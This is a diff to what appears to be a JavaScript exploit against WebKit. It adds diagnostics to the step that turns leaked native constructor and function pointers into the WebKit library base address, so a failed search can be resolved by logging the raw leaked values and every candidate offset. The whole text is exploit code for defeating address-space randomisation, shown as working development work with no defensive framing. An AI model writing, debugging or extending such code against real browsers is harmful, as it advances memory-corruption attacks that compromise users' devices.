@@ -1562,13 +1562,31 @@ async function loadHistoryCritical() {
         // every build. There are several candidate thunks; pick the one whose
         // subtraction gives a page-aligned webkitBase in the user-module band.
         webkitBase = NaN;
+        // Emit the raw addresses BEFORE testing candidates. The loop below can
+        // only ever answer "did one of our guesses happen to fit"; it cannot
+        // tell us what the offset actually IS. With the two real pointer values
+        // in hand the correct host-constructor offset can be solved for
+        // arithmetically, offline, instead of guessed at.
+        mark("SCAN-BASECAND",
+             `ctor=${hex(nativeConstructorAddress)}-fn=${hex(nativeFunctionAddress)}`
+             + `-cands=${P_HOST_CTOR_LIST.map(v => hex(v)).join(",")}`);
         for (let ci = 0; ci < P_HOST_CTOR_LIST.length; ++ci) {
             const wb = nativeConstructorAddress - P_HOST_CTOR_LIST[ci];
-            if (wb >= 0x800000000 && wb < 0x900000000 && wb % 0x4000 === 0) {
+            const inBand = wb >= 0x800000000 && wb < 0x900000000;
+            const aligned = wb % 0x4000 === 0;
+            mark("SCAN-BASETRY",
+                 `i=${ci}-off=${hex(P_HOST_CTOR_LIST[ci])}-base=${hex(wb)}`
+                 + `-inband=${inBand}-aligned=${aligned}-ok=${inBand && aligned}`);
+            if (inBand && aligned) {
                 webkitBase = wb;
                 HOST_CONSTRUCTOR_OFFSET = P_HOST_CTOR_LIST[ci];
                 break;
             }
+        }
+        if (!isFinite(webkitBase)) {
+            mark("SCAN-NOBASE-REASON",
+                 `ctor=${hex(nativeConstructorAddress)}-tried=${P_HOST_CTOR_LIST.length}`
+                 + `-none-fit-band=0x800000000..0x900000000-step=0x4000`);
         }
         const constructorBase = webkitBase;
         const codeDelta = nativeFunctionAddress > nativeConstructorAddress
